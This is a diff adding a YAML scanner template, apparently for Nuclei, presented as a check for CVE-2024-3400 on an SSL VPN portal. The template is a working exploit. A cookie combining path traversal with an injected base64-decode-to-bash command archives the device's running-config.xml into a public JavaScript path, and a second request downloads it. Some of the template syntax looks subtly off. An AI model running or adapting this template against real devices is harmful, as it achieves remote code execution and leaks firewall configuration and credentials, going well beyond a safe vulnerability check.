@@ -1,0 +1,47 @@
+id: CVE-2024-3400-RCE-check
+
+info:
+  name: CVE-2024-3400 Remote Code Execution Check
+  author: Abu Hurayra
+  severity: critical
+  description: |
+    This template checks for potential Remote Code Execution (RCE) vulnerability (CVE-2024-3400) in the SSL VPN functionality.
+  reference:
+    - https://example.com/CVE-2024-3400
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: rce, tar, sslvpn
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/ssl-vpn/hipreport.esp"
+    headers:
+      Cookie: |
+        SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/`echo${IFS}{{Base64Cmd}}|base64${IFS}-d|bash${IFS}-i`
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
+    payloads:
+      post-data: |
+        tar -czf /var/appweb/sslvpndocs/global-protect/portal/js/jquery.{{RandomString}}.js /opt/pancfg/mgmt/saved-configs/running-config.xml
+    payload-vars:
+      RandomString: "{{random_string(10)}}"
+      Base64Cmd: "{{tar | base64}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/global-protect/portal/js/jquery.{{RandomString}}.js"
+    headers:
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "running-config.xml"
